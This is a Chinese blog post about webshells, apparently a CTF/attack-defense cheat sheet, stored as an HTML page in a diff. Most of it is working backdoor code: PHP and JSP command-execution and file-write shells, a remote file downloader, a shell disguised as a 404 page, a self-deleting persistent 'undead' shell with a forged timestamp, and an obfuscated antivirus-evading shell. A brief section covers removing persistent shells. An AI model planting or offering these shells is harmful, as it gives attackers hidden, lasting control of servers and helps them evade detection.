@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>一句话木马及其他功能木马 | 吴家兴的博客</title>
+    
+    
+        <meta property="og:site_name" content="吴家兴的博客">
+    
+    
+        <meta property="article:author" content="WuJiaxing">
+    
+    
+        <link rel="icon" href="/img/favicon.ico">
+    
+    
+<link rel="stylesheet" href="/css/minireset.min.css">
+
+    
+<link rel="stylesheet" href="/css/all.min.css">
+
+    
+<link rel="stylesheet" href="/css/csshake.min.css">
+
+    
+<link rel="stylesheet" href="/css/hljs/lioshi.css">
+
+    
+<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
+
+    
+<link rel="stylesheet" href="/styl/main.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/jquery.fancybox.min.js"></script>
+
+    
+<script src="/js/clipboard.min.js"></script>
+
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <header>
+  <div class="outer">
+    <div class="inner">
+      <h1 class="logo-wrap">
+        <a>吴家兴的博客<b><sup>1.2</sup></b></a>
+      </h1>
+    </div>
+    <div class="inner">
+      <nav class="main-nav">
+        
+          
+            <a href="/">首页</a>
+          
+        
+          
+            <a href="/archives">归档</a>
+          
+        
+          
+            <a href="/categories">分类</a>
+          
+        
+          
+            <a href="/tags">标签</a>
+          
+        
+          
+            <a href="/friends">友链</a>
+          
+        
+          
+            <a href="/about">关于</a>
+          
+        
+          
+            <div class="dropdown">
+              <a class="dropbtn">个人项目</a>
+              <div class="dropdown-content">
+                
+                  <a href="http://prowiki.wujiaxing.cn/" target="_blank" rel="noopener">Hexo主题</a>
+                
+                  <a href="https://readflag.cn/" target="_blank" rel="noopener">CTF在线工具</a>
+                
+                  <a href="https://search.readflag.cn/" target="_blank" rel="noopener">CTF题目搜索</a>
+                
+              </div>
+            </div>
+          
+        
+      </nav>
+    </div>
+  </div>
+</header>
+    <div class="content">
+        <section class="outer">
+    <article>
+        <div class="article-title">
+    <h2>
+        <a href="/2019/12/15/dd9e3634/" class="shake shake-little" title="一句话木马及其他功能木马">
+            
+            一句话木马及其他功能木马
+        </a>
+    </h2>
+    <div class="meta_box">
+    
+        
+        
+            
+                
+        
+        <div class="meta meta_auth">
+            <img src="/img/default.png" alt="head" />
+            <p>anonymous</p>
+        </div>
+    
+        
+        
+        <div class="meta meta_date">
+            <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+            <p>发布于：2019年12月15日</p>
+        </div>
+    
+        <div class="meta meta_update">
+            <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+            <p>更新于：2021年05月31日</p>
+        </div>
+    </div>
+    
+
+</div>
+
+        <hr>
+        <div class="article-entry">
+            
+            
+            
+            <a id="more"></a>
+<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。</p>
+<figure class="highlight php"><figcaption><span>PHP</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_REQUEST[<span class="hljs-string">"hdxw"</span>]);<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">// 绕过<span class="hljs-meta">&lt;?</span>限制的一句话，php版本小于7</span><br>&lt;script language=<span class="hljs-string">"php"</span>&gt;@<span class="hljs-keyword">eval</span>($_REQUEST[<span class="hljs-string">"hdxw"</span>])&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight jsp"><figcaption><span>JSP</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;!-- web目录写文件，f: 文件名，t: 文件内容 --&gt;<br>&lt;% <span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">"f"</span>)!=<span class="hljs-keyword">null</span>)(<span class="hljs-keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="hljs-string">"/"</span>)+request.getParameter(<span class="hljs-string">"f"</span>))).write(request.getParameter(<span class="hljs-string">"t"</span>).getBytes());%&gt;<br><br>&lt;!-- 指定目录写文件，f: 文件名，t: 文件内容 --&gt;<br>&lt;% <span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">"f"</span>)!=<span class="hljs-keyword">null</span>)(<span class="hljs-keyword">new</span> java.io.RandomAccessFile(request.getParameter(<span class="hljs-string">"f"</span>),<span class="hljs-string">"rw"</span>)).write(request.getParameter(<span class="hljs-string">"t"</span>).getBytes()); %&gt;<br><br>&lt;!-- FileOutputStream和RandomAccessFile可以互换 --&gt;<br><br>&lt;!-- 无回显执行系统命令 --&gt;<br>&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">"cmd"</span>)); %&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><figcaption><span>shtml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shtml">&#x2F;&#x2F; 有回显命令执行，访问&#x2F;shell.shtml?whoami<br>&lt;!--#exec cmd&#x3D;var&#x3D;&quot;QUERY_STRING_UNESCAPED&quot; --&gt;<br><br>&#x2F;&#x2F; 文件包含，不能使用“..&#x2F;”，也不能使用绝对路径，不会输出php代码<br>&lt;!--#include file&#x3D;&quot;upload.php&quot; --&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="功能小马"><a href="#功能小马" class="headerlink" title="功能小马"></a>功能小马</h3><figure class="highlight jsp"><figcaption><span>JSP</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;!-- 有密码有回显命令执行 --&gt;<br>&lt;!-- 请求：http:<span class="hljs-comment">//localhost:8080/shell.jsp?pwd=hdxw&amp;cmd=calc.exe --&gt;</span><br>&lt;%<br><span class="hljs-keyword">if</span>(<span class="hljs-string">"hdxw"</span>.equals(request.getParameter(<span class="hljs-string">"pwd"</span>)))&#123;<br>	java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">"cmd"</span>)).getInputStream();<br>	<span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<br>	<span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];<br>	out.print(<span class="hljs-string">"&lt;pre&gt;"</span>);<br>	<span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>		out.println(<span class="hljs-keyword">new</span> String(b));<br>	&#125;<br>	out.print(<span class="hljs-string">"&lt;/pre&gt;"</span>);<br>&#125;<br>%&gt;<br><br>&lt;!-- 远程文件下载（保存到服务器） --&gt;<br>&lt;!-- 请求：http:<span class="hljs-comment">//localhost:8080/shell.jsp?f=C:\JspStudy\WWW\1.png&amp;u=http://www.baidu.com/img/bdlogo.png --&gt;</span><br>&lt;%<br>java.io.InputStream in = <span class="hljs-keyword">new</span> java.net.URL(request.getParameter(<span class="hljs-string">"u"</span>)).openStream();<br><span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>java.io.ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> java.io.ByteArrayOutputStream();<br><span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>   baos.write(b, <span class="hljs-number">0</span>, a);<br>&#125;<br><span class="hljs-keyword">new</span> java.io.FileOutputStream(request.getParameter(<span class="hljs-string">"f"</span>)).write(baos.toByteArray());<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="伪装小马"><a href="#伪装小马" class="headerlink" title="伪装小马"></a>伪装小马</h3><figure class="highlight php"><figcaption><span>利用404页面，php版本小于7</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE HTML <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;<br>&lt;html&gt;&lt;head&gt;<br>&lt;title&gt;<span class="hljs-number">404</span> Not Found&lt;/title&gt;<br>&lt;/head&gt;&lt;body&gt;<br>&lt;h1&gt;Not Found&lt;/h1&gt;<br>&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;<br>&lt;/body&gt;&lt;/html&gt;<br><span class="hljs-meta">&lt;?php</span><br>@preg_replace(<span class="hljs-string">"/[pageerror]/e"</span>,$_POST[<span class="hljs-string">'error'</span>],<span class="hljs-string">"hdxw"</span>);<br>header(<span class="hljs-string">'HTTP/1.1 404 Not Found'</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment"># 请求：index.php   POST  error=phpinfo();</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h3><p>内存马，通俗讲就是不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行。</p>
+<p>不死马.php =&gt; 上传到server =&gt; server执行文件 =&gt; server本地无限循环生成 (一句话.php)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>ignore_user_abort(<span class="hljs-keyword">true</span>);<br>set_time_limit(<span class="hljs-number">0</span>);<br>unlink(<span class="hljs-keyword">__FILE__</span>);<br>$file = <span class="hljs-string">'.hdxw.php'</span>;<br>$code = <span class="hljs-string">'&lt;?php if(md5($_GET["pwd"])=="46c7efbdee0bc5d3f584ce3f344a43e5")&#123;@eval($_POST["code"]);&#125; ?&gt;'</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>   file_put_contents($file, $code);<br>   system(<span class="hljs-string">'touch -m -d "2020-01-01 01:01:01" .hdxw.php'</span>);<br>   usleep(<span class="hljs-number">5000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment"># 请求：hdxw.php?pwd=hdxw POST code=phpinfo();</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="不死马查杀"><a href="#不死马查杀" class="headerlink" title="不死马查杀"></a>不死马查杀</h4><p>1、如果允许，重启服务是万能的<br>2、其次，最好的解决方案是kill掉www-data用户的所有子进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep www-data | awk <span class="hljs-string">'&#123;print $2&#125;'</span> | xargs <span class="hljs-built_in">kill</span> -9<br></code></pre></td></tr></table></figure>
+<p>3、创建一个和不死马生成的马一样名字的目录<br>4、编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果。简单示例：<br></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>	$pid = 不死马的进程PID;<br>	@unlink(<span class="hljs-string">".hdxw.php"</span>);<br>	exec(<span class="hljs-string">"kill -9 $pid"</span>);<br>	usleep(<span class="hljs-number">1000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="免杀马"><a href="#免杀马" class="headerlink" title="免杀马"></a>免杀马</h3><p>可以绕过安全检测的木马，和安全检测产品斗智斗勇的产物，也需要不断更新。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$_uU=chr(<span class="hljs-number">99</span>).chr(<span class="hljs-number">104</span>).chr(<span class="hljs-number">114</span>);$_cC=$_uU(<span class="hljs-number">101</span>).$_uU(<span class="hljs-number">118</span>).$_uU(<span class="hljs-number">97</span>).$_uU(<span class="hljs-number">108</span>).$_uU(<span class="hljs-number">40</span>).$_uU(<span class="hljs-number">36</span>).$_uU(<span class="hljs-number">95</span>).$_uU(<span class="hljs-number">80</span>).$_uU(<span class="hljs-number">79</span>).$_uU(<span class="hljs-number">83</span>).$_uU(<span class="hljs-number">84</span>).$_uU(<span class="hljs-number">91</span>).$_uU(<span class="hljs-number">49</span>).$_uU(<span class="hljs-number">93</span>).$_uU(<span class="hljs-number">41</span>).$_uU(<span class="hljs-number">59</span>);$_fF=$_uU(<span class="hljs-number">99</span>).$_uU(<span class="hljs-number">114</span>).$_uU(<span class="hljs-number">101</span>).$_uU(<span class="hljs-number">97</span>).$_uU(<span class="hljs-number">116</span>).$_uU(<span class="hljs-number">101</span>).$_uU(<span class="hljs-number">95</span>).$_uU(<span class="hljs-number">102</span>).$_uU(<span class="hljs-number">117</span>).$_uU(<span class="hljs-number">110</span>).$_uU(<span class="hljs-number">99</span>).$_uU(<span class="hljs-number">116</span>).$_uU(<span class="hljs-number">105</span>).$_uU(<span class="hljs-number">111</span>).$_uU(<span class="hljs-number">110</span>);$_=$_fF(<span class="hljs-string">""</span>,$_cC);@$_();<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// create_function('','eval($_POST[1]);')();</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
+<li><a href="https://www.freebuf.com/articles/web/9396.html" target="_blank" rel="noopener">那些强悍的PHP一句话后门</a></li>
+<li><a href="http://p2j.cn/?p=1627" target="_blank" rel="noopener">jsp小后门</a></li>
+<li><a href="https://blog.csdn.net/qq_20307987/article/details/75047221" target="_blank" rel="noopener">免杀的php webshell</a></li>
+<li><a href="https://www.cnblogs.com/unixcs/p/11301377.html" target="_blank" rel="noopener">不死马</a></li>
+<li><a href="https://blog.csdn.net/ski_12/article/details/84920127" target="_blank" rel="noopener">PHP内存型木马</a></li>
+<li><a href="https://xz.aliyun.com/t/1530/" target="_blank" rel="noopener">XDCTF-2017-Final 经验总结</a></li>
+<li><a href="https://blog.csdn.net/smartsmile2012/article/details/52886060" target="_blank" rel="noopener">ssi服务器端指令详解(shtml)</a></li>
+</ul>
+
+            <div class="article-copyright">
+                
+    <blockquote>
+        <p>
+            版权声明：本文为「Blog.WuJiaxing.Cn」的原创文章，博客内容遵循 署名-非商业性使用-相同方式共享 协议。<br>本文永久链接是：https://blog.wujiaxing.cn/2019/12/15/dd9e3634/
+        </p>
+    </blockquote>
+
+
+            </div>
+        </div>
+    </article>
+    
+
+    <section id="toc-div" >
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一句话木马"><span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#功能小马"><span class="toc-text">功能小马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#伪装小马"><span class="toc-text">伪装小马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#不死马"><span class="toc-text">不死马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#不死马查杀"><span class="toc-text">不死马查杀</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#免杀马"><span class="toc-text">免杀马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
+    </section>
+    <section id="gohome" style="display: none;"><a><i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i></a></section>
+
+
+</section>
+    </div>
+    <footer>
+    <div class="outer">
+        <div class="inner">
+            Powered by <a href="https://blog.wujiaxing.cn" target="_blank">ProWiki</a>
+            &copy;2022 WuJiaxing<br>
+            <a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener">冀ICP备00000000号</a>
+        </div>
+    </div>
+</footer>
+
+<script src="/js/custom.js"></script>
+
+
+    <script>onload_content();</script>
+
+</body>
+</html>
